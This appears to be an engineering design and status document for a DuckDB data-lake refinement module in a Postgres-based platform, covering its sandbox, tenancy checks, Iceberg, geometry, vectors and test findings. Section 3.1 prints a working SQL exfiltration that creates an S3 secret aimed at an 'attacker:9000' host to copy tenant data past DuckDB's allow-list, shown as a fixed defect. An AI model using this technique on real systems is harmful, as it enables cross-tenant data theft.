# The lake — refinement after staging, in DuckDB

**Status: the database half ships; the worker is not deployed.** `lake.sql` is
in `build-sql.py`'s `ORDER`, so `CREATE EXTENSION percolate` installs it.
`core/percolate_core/lake/` is the worker, `lake.sql` and four `content.datasets` columns in `schema.sql` are
the database half, a `LAKE` mode in the p8ql parser is how it is asked (§6a),
and `dev/tests/content/e2e-lake.py` runs it end to end — every check passing at the time, against PG19, MinIO and a Lakekeeper Iceberg
catalog, with a real `percolate lake serve` claiming real workflow steps. No
compose file, chart or published image carries a lake worker or a catalog yet
(§8).

`sources.md` §3 splits what a source *told* us (staging) from what we *believe*
(the three targets). This document is the space between them: filtering,
cleaning, joining, deduplicating, locating and embedding. Doing that work in
Postgres means landing the whole feed first. Doing it here means Postgres
receives the part worth keeping.

---

## 1. What it replaces, measured

An API pull today lands every record as a row: `content.commit_api_page` writes
`raw` and `data` jsonb into `content.source_records`, ten thousand records a
page, and any cleaning happens after that. `e2e-lake.py` §6 puts a number on
the difference, over the same 50,000 staged shipments:

| | WAL written | in Postgres afterwards |
|---|---|---|
| the 50,000 records as `source_records`-shaped rows | **28.95 MB** | a 26.2 MB table |
| three lake runs: filter + join + geocode + embed to Parquet, merge to Iceberg, nearest-5 landed | **0.32 MB** | 3 registry rows, 5 landed rows, run bookkeeping |

The 1,282 rows the first run kept, and their 1,282 embeddings, never touched
Postgres. They are in object storage, registered by name, and readable by the
next step.

This does not retire the jsonb path. A feed small enough to want row-level
upserts and RLS on every record still belongs there. The lake is for the feed
where the database would be a staging area it cannot afford.

---

## 2. The step

A `work` step on its own queue, op `refine`. Not a new step kind: YAML.md's
promotion rule is the second independent consumer, and there is one.

```yaml
- id: clean
  work: true
  queue: lake
  input:
    op: refine
    inputs:
      raw:   {dataset: shipments_raw}                     # Parquet or Iceberg, by name
      watch: {rows: '{{steps.watchlist.result.rows}}'}    # the small Postgres side
      near:  {nearest: {dataset: notes, column: emb, k: 20,
                        vector: '{{steps.q.result.embedding}}', model: text-embedding-3-small}}
    sql: |
      select r.id, r.carrier, ST_Point(r.lon, r.lat) as geom, r.note
      from raw r join watch w using (carrier)
      where r.shipped_at >= $since::timestamp
    params: {since: '{{run.since}}'}
    embed:  {column: note, into: note_emb, model: text-embedding-3-small, max_rows: 20000}
    output: {dataset: watched, format: iceberg, mode: merge, key: [id],
             geometry: {geom: {crs: 'OGC:CRS84'}}, visibility: org}
    land:   {function: land_watched, max_rows: 2000}
```

- **`inputs`** are names, never paths. Postgres resolves them as the run owner
  (§3.3). `rows:` carries the small side from an earlier step, which is how
  `sources.md` §6 said a cross-store join should work: push the small side down
  as a parameter.
- **`sql`** is one `SELECT`. Values go in `params:` and bind as `$name`. A
  `{{template}}` in the SQL is refused. The worker substitutes templates into
  every string of a `work` input before the op sees it, so the check reads the
  unresolved `task_input`. A `sql:` step binds its templates as parameters
  instead (`YAML.md`), which a `work` op cannot.
- **`output`** is a Parquet dataset (`append` | `replace`) or an Iceberg table
  (`append` | `replace` | `merge`). `merge` on Parquet is refused in the worker
  and by a CHECK: a prefix of files has no row identity.
- **`land`** calls a function registered in `workflow.step_functions` with the
  signature `(task uuid, worker text, rows jsonb)`. **`max_rows` is mandatory**,
  checked against the result's count before anything is written anywhere. It
  bounds the database the way `max_fanout` bounds a matrix. The rows cross in
  one transaction, in batches of `batch_rows` (at most 10,000).
- **`embed`** adds a vector column through `ingest/embed.embed_texts`, the same
  code and registry row the corpus pipeline uses. `max_rows` is mandatory
  because every row costs money.

A step with neither `output:` nor `land:` is refused, because it would keep nothing.

---

## 3. The boundary, and what running it found

### 3.1 A locked connection still exfiltrated

The first design was DuckDB's own sandbox: `allowed_directories`,
`enable_external_access = false`, `lock_configuration = true`. Against MinIO it
refused other tenants' prefixes, globs, local files, `ATTACH`, `INSTALL` and
re-enabling access. Then authored SQL did this:

```sql
create secret hijack (type s3, key_id 'evil', secret '…', endpoint 'attacker:9000',
                      scope 's3://lake/tenant-a/exfil');
copy (select * from 's3://lake/tenant-a/x.parquet') to 's3://lake/tenant-a/exfil.parquet';
```

`CREATE SECRET` is allowed after the lock. The allow-list passed the path, the
more specific secret won, and the object appeared on the second server. **The
allow-list is not the boundary.** Authored SQL is therefore exactly one
`SELECT`, classified by DuckDB's own parser (`extract_statements`), and every
write is the module's. `select * from query('create secret …')` passes that
check, because it is one `SELECT`, and DuckDB then refuses to execute it
("Expected a single SELECT statement"). `core/tests/test_lake_guard.py`
pins both.

### 3.2 The seal

| Setting | Why |
|---|---|
| `allowed_directories` | the resolved input locations and the output's own prefix, each with a trailing slash so `…/sales` does not also allow `…/sales_private` |
| `enable_external_access = false` | no other path, no `ATTACH`, no `INSTALL` |
| `allow_unredacted_secrets = false` | `duckdb_secrets(redact := false)` is refused ("Displaying unredacted secrets is disabled") |
| `allow_persistent_secrets = false` | nothing written to `~/.duckdb` |
| `lock_configuration = true` | none of the above can be set back |

Two measured details. The secret settings are refused once any secret exists
("Changing Secret Manager settings after the secret manager is used"), so they
are set when the connection opens. The first end-to-end run set them late, and
every step failed. And the allow-list compares strings: `…/mine/../theirs/`
starts with an allowed directory. MinIO refused that path, but an HTTP layer
that normalises dot segments per RFC 3986 would not. So a dot segment is
refused in the worker, before it reaches the allow-list, and again in
`register_lake_output`.

**The catalog is never attached where authored SQL runs.** An Iceberg input is
read by `iceberg_scan(<metadata file>)`, with the metadata location fetched from
the catalog's REST API and the table's own location on the allow-list. An
Iceberg output is staged as Parquet under the output prefix, then committed by a
second connection that has never run authored SQL.

### 3.3 Postgres decides; the worker scans

| Function | Boundary |
|---|---|
| `content.lake_resolve(task, worker, names)` | Resolves input names as the run owner, through `rbac.may_read`. The claims are set transaction-local for the call. Unreadable and nonexistent return the same message, so the function is not an existence oracle. |
| `content.lake_target(task, worker, name, format)` | The output layout (`lake/<org>/<name>`, namespace `o_<org hex>`), stated once. Also refuses a name the owner may not write. |
| `content.register_lake_output(task, worker, out)` | Refuses a prefix outside the writing org, a dot segment, another org's namespace, an unregistered embedding model and a wrong width. |
| `content.lake_land(task, worker, fn, rows)` | Calls only `workflow.step_functions` rows with the landing signature, and caps a batch at 10,000 rows. |

`register_lake_output`'s location check is the one that matters most. The
registry is what the seal trusts, and the worker's S3 credential reaches every
org's prefix. A row in org A pointing into org B's prefix would make B's files
readable to every workflow in A. `e2e-lake.py` §5 tries all five refusals
against a real claimed task.

### 3.4 What this does not guard

- **The worker's S3 credential is deployment-wide.** The registry check and the
  seal are what keep tenants apart, and a bug in the worker's own code (not in
  authored SQL) could still read anything the key can. Per-org credentials
  (STS, or a MinIO policy per org prefix) would make the registry a second
  layer rather than the only one. Not built.
- **`bucket` is taken from the worker.** The prefix is checked; the bucket is
  not, because the database does not know the lake bucket's name.
- **Egress.** The lake pool should reach the store, the catalog, Postgres and
  the embedding endpoint, and nothing else. `pools.md` has the NetworkPolicy
  shape. Nobody has written the policy for this pool.

---

## 4. Iceberg

Through a REST catalog. Measured on DuckDB 1.5.5 against Lakekeeper
(`quay.io/lakekeeper/catalog:latest-main`, its own catalog in Postgres,
warehouse on MinIO): create, insert, update, delete, `MERGE … UPDATE SET * /
INSERT *`, time travel to the first snapshot, and `ALTER TABLE ADD COLUMN` all
work. `CREATE OR REPLACE` does not ("not supported in DuckDB-Iceberg"), so
`replace` is a delete and an insert in one transaction. Any REST catalog should
serve, since the worker needs only `P8_LAKE_CATALOG_URL` and
`P8_LAKE_WAREHOUSE`. Only Lakekeeper has been run.

**Why not DuckLake.** It works too (measured: native GEOMETRY, a 28-table
catalog inside Postgres, no extra service), and it is the closer fit to
*Postgres is the system*. But DuckDB would need a direct Postgres login with
write grants on that catalog schema, and the worker is built to hold no table
grants. Iceberg is also what other engines read. Revisit DuckLake if it gains a
way to go through functions rather than tables.

**What Iceberg cannot hold, and where the difference is kept.** It has no
fixed-width array ("Array type not supported in Iceberg type. Please cast to
LIST"). Lakekeeper rejected DuckDB's GEOMETRY schema outright (422,
`SchemaEnum` did not match). So a vector is stored as `FLOAT[]` and a shape as
WKB. `content.datasets.embeddings` and `.geometry` record what they were, and
the view that reads an input restores `FLOAT[N]` and `GEOMETRY('<crs>')`, so
authored SQL sees the types the data was written with.

**Retries.** A work step is retried when a worker dies. An Iceberg `append`
adds a `_p8_task` column and deletes this task's earlier rows in the same
transaction that inserts them. Readers never see the column. Measured by
running the op twice under one claim: 100 rows, then 100 again. Parquet
outputs are keyed by the task, so a retry overwrites its own object.

**`content.dataset_uri` of an Iceberg dataset** returns `iceberg:<table_ref>`,
which `read_parquet` refuses by name. A glob over an Iceberg table's data
directory would return every row a delete or a merge had removed.

---

## 5. Geometry

DuckDB `spatial` is loaded in every lake connection. Postgres has no PostGIS
(it is optional and nothing needs it yet), so a
shape crosses into Postgres through `land:` as GeoJSON in jsonb. Queries over
shapes happen in the lake.

**A CRS is a declaration, not a guess.** `ST_Point` returns `GEOMETRY` with no
CRS, and Parquet writes such a column as `OGC:CRS84` whatever it holds:

```
ST_Point(530000, 180000)                      written, read back: GEOMETRY('OGC:CRS84')
ST_Point(530000, 180000)::GEOMETRY('EPSG:27700')  written, read back: GEOMETRY('EPSG:27700')
```

British National Grid metres, labelled as longitude and latitude degrees. So an
output geometry column must carry a CRS on its type or declare one in
`output.geometry`. The declaration is cast onto the column before it is
written, and a declaration that contradicts the type is refused. It is
`sources.md` §13.5's rule for epoch scale, applied to coordinates.

**Axis order is the other trap, and it gives no error.**
`ST_Distance_Sphere(ST_Point(-0.12, 51.5), ST_Point(2.35, 48.85))`, London to
Paris in lon/lat, returns 403 km. The same call with (lat, lon) returns 343 km,
which is right. The function expects latitude first, while `ST_Point` and
`OGC:CRS84` put longitude first.

GeoJSON is WGS84 by RFC 7946. Landing a shape in another CRS as GeoJSON
mislabels it. That is not refused yet.

---

## 6. Vectors

- **Stored as `FLOAT[]` in both formats.** Parquet drops the width too: a
  `FLOAT[3]` written came back `FLOAT[]`. The registry's `{model, dims}` is what
  restores `FLOAT[N]` on read.
- **The model names the space**, as it does in `aiq`. The registry refuses an
  unregistered model or a width that model does not produce, and a `nearest:`
  input refuses a query vector from a different model than the column's. Two
  models of one width produce vectors that rank against each other with no
  error, so the refusal has to be by name.
- **Search is exact.** `nearest:` is `array_cosine_distance … order by … limit
  k` over the whole dataset. `vss` is loaded, but an HNSW index lives only in the
  connection that built it, and nothing here builds one. Past a few million
  rows this needs an index built per query or kept somewhere, and neither is
  designed.
- **Landing vectors in `aiq`.** `aiq.record_embeddings` keys by `chunk_id`, and
  a lake row is not a chunk. Moving vectors into a pgvector space means a
  landing function that knows which consumer table the rows belong to. None
  ships.

---

## 6a. Asking the lake in p8ql

```
LAKE FROM watched, watched_ice
select w.carrier, count(*) as n, round(avg(ST_Y(i.geom)), 3) as mean_lat
from watched w join watched_ice i using (id)
where w.note like 'damaged%' group by 1 order by 1
```

A p8ql mode, so it reaches every surface that already speaks p8ql: `aiq.query`,
the agent's `query` tool, the workbench, and `p8ql:` steps. The datasets come
first, and each is a table under its own name. Everything after the dataset
list, from the first `SELECT` or `WITH`, is DuckDB SQL and reaches the worker
byte for byte. The parser scans LAKE before it tokenizes, because tokenizing
would split on commas and treat the apostrophe in `'O''Neil'` as a quote.
There is no p8ql `LIMIT`; the statement has its own. The plan carries a cap
of 1000 rows, and the worker reads the cap from the plan.

**Postgres plans it and cannot run it.** `aiq.query` resolves the dataset list
as the caller (`content.lake_plan`, through `rbac.may_read`). It reports names
that did not resolve in `unresolved`, the way LOOKUP does, and another tenant's
dataset is indistinguishable there from one that does not exist. It returns
each dataset's columns, vector spaces and CRS, and no storage location. The
envelope says `executed: false` and where the query runs.

**A workflow runs it.** A `p8ql:` step whose query is LAKE compiles, in the
parser crate, to `work: true, queue: lake, input: {op: query, p8ql: …}`. That is
the step an author could write by hand, and `06-lake.sql` §5 holds the two
spellings to an identical stored spec, as `09-embed-sugar.sql` does for
`embed:`. The lake worker's `query` op parses the string with `aiq_parse`, so it
is the same plan a caller saw. It resolves the datasets for the run owner, runs
the statement sealed, and returns `{rows, columns, truncated, sources}`. A
successor reads `{{steps.<id>.result.rows}}`. `e2e-lake.py` §7 runs that path
and checks the join of a Parquet and an Iceberg dataset against a direct
DuckDB count.

**A template in a LAKE query is refused at compile time.** The worker would
splice it into the SQL as text. A lake query that needs values from the run is
a `refine` step, whose `params:` bind.

**Discovery is `SCHEMA "lake"`**, a caller-scoped facet listing the datasets
the caller may read, with their columns. `SCHEMA "lake" FROM ship` narrows it
by substring. It is not folded into `SCHEMA "p8ql"`, because that facet is
global and versioned by hash, and a per-caller list would give every caller a
different hash. The p8ql grammar names the LAKE mode and points at the facet,
so the agent's `query` tool, whose description is built from `SCHEMA "p8ql"`,
advertises the lake with no change to the tool.

**What an agent gets today is a plan, not rows.** That was the decision for
this version. The `query` tool calls `aiq.query` in a read-only transaction and
receives the resolved plan, exactly as it receives a statement for SQL mode.
Rows come from a workflow. Interactive execution is the case an MCP tool in the
lake pool would add, and it would close SQL mode's identical gap at the same
time.

---

## 7. How it was run

```bash
# The probe ran on quay.io/minio/minio:RELEASE.2025-09-07T16-13-09Z, which no
# longer pulls anonymously. RustFS speaks the same S3 API and passed the
# same storage tests, so a rerun uses it:
docker run -d --name p8lake-minio -p 19100:9000 -e RUSTFS_ACCESS_KEY=probe \
  -e RUSTFS_SECRET_KEY=probepass123 -v p8lake-s3:/data rustfs/rustfs:1.0.3
docker run -d --name p8lake-pg --network p8lake -e POSTGRES_PASSWORD=pg -e POSTGRES_DB=catalog postgres:17
docker run --rm --network p8lake -e LAKEKEEPER__PG_DATABASE_URL_{READ,WRITE}=… \
  quay.io/lakekeeper/catalog:latest-main migrate        # then `serve` on :19181,
                                                        # bootstrap, one S3 warehouse "lake"
PATH=core/.venv/bin:$PATH dev/reload.sh scratch_lake
core/.venv/bin/python dev/tests/content/e2e-lake.py      # every check passed at the time
```

Also run against the same tree: every `dev/tests` suite on `scratch_lake`
(all pass; `03-cron-tick` skipped, as for any database pg_cron does not tick),
`build-sql.py --check`, `dev/upgrade-converges.sh` and `surface.sql` (at the
time: 0.1.6 upgraded and 0.2.0 fresh identical, 2,875 objects; `surface.sql`
322 capabilities).

Running it found seven defects, each fixed where it lives:

1. `CREATE SECRET` after the lock exfiltrated (§3.1). Fixed by the single-`SELECT` guard.
2. Secret settings set after the first secret failed every step (§3.2).
3. Every DuckDB failure was retried five times. Now only I/O is retried.
4. On DuckDB 1.5, `.arrow()` returns a `RecordBatchReader`, not a Table.
5. Parquet labels an undeclared CRS as `OGC:CRS84` (§5).
6. `lake_namespace` and `lake_prefix` were callable by `authenticated`, and
   `surface.sql` refused them.
7. **`dev/reload.sh` could not report an audit failure.** It filtered with
   `^ERROR` and ended in `|| true`, but psql prints
   `psql:/tmp/surface.sql:1057: ERROR: …`, so the pattern never matched and the
   status was dropped. The reload said "is current" three times while the
   audit refused item 6. It now exits 1, and that was checked by reintroducing
   the grant.

And one outside this module: `e2e-ingest.py` waited for run status `completed`,
which the engine renamed to `succeeded`. Its wait would time out on every
successful run. Fixed; not re-run, because it needs a real embedding key.

---

## 8. Not built, and open

- **Deployment.** No lake worker or catalog in `get-percolate/compose`, the
  chart, or `dev/docker-compose.yml`. The image fetches DuckDB's extensions at
  build time (`core/.github/scripts/fetch_duckdb_extensions.py`) and runs
  `percolate lake doctor` where the build is native.
- **Runs have an org now, and this bullet's remaining half is a test change.**
  `workflow.set_run_owner()` derives a run's org from its definition's
  (`spec.md` §17(b)), so starting a run in a named org is: author the
  workflow in that org. `dev/tests/workflow/21-a-run-belongs-to-its-definitions-org.sql`
  asserts it, including that a *shared-tier* definition still produces a
  shared-tier run — so a deployment whose workflows nobody has scoped is
  unchanged, and that is the case `e2e-lake.py` is in.

  What is left: `e2e-lake.py` sets `runs.org_id` by hand at three places
  (`:208`, `:526` and `:570`), and those can now become an org on the
  *definition* instead, which is the mechanism the workflow engine specifies
  rather than a stand-in for something unbuilt. Not done
  here because the file needs MinIO and an Iceberg catalog and is in no gate, so
  the change could not be run — and an unrun edit to the only end-to-end lake
  test is worse than an accurate note about it.
- **Iceberg catalog auth** (`P8_LAKE_CATALOG_TOKEN_REF`) is written and not run.
  Lakekeeper ran with no auth.
- **A `merge` into a table an `append` created** carries `_p8_task`, and
  `UPDATE SET *` from a source without it is untested.
- **Parquet `replace` never deletes** the previous `v-<task>/` directory.
  Compaction and garbage collection are `sources.md` §11's step 7.
- **`embed` materialises the result in the worker's memory**, which is bounded
  only by `embed.max_rows`.
- **Upload datasets have the replace problem this module avoids.** Read, not
  run: `register_dataset(…, 'replace')` forgets the other members, but
  `dataset_uri` still globs `datasets/<name>/*.parquet`, and the old objects are
  still under it. So a reader keeps seeing replaced rows. Lake outputs write each
  `replace` to a fresh `v-<task>` prefix for this reason.
- **The registry and the catalog can disagree.** Found by running the test
  twice against one Lakekeeper: reloading the database removed the
  `content.datasets` row, the Iceberg table stayed, and the next `append` under
  that name wrote onto its old rows (100 became 200). Deleting a dataset has to
  drop its table, or `lake_target` has to treat a catalog table with no registry
  row as a refusal. Neither is built.
- **Agents plan LAKE queries and cannot run them interactively** (§6a). The
  `query` tool returns the plan, as it returns the statement for SQL mode.
  Rows come from a `p8ql:` step in a workflow.
- **Moments.** `sources.md` §7's `content.moments` does not exist, so the
  obvious landing target for a refined time series has no table.

## `content.dataset_files`

Which resources make up a dataset. A dataset is not one upload: the resource on
the other side of this join still exists in its own right, with its own bytes,
uploader, checksum and visibility. The row carries the object key and a row
count, so a reader can size a dataset without opening it.

It is the join and not a copy of either side, which is what keeps a file's
tenancy on the file. Without it a dataset would either own its files — and then
a file could belong to one dataset only — or restate their visibility, and the
two copies would drift.
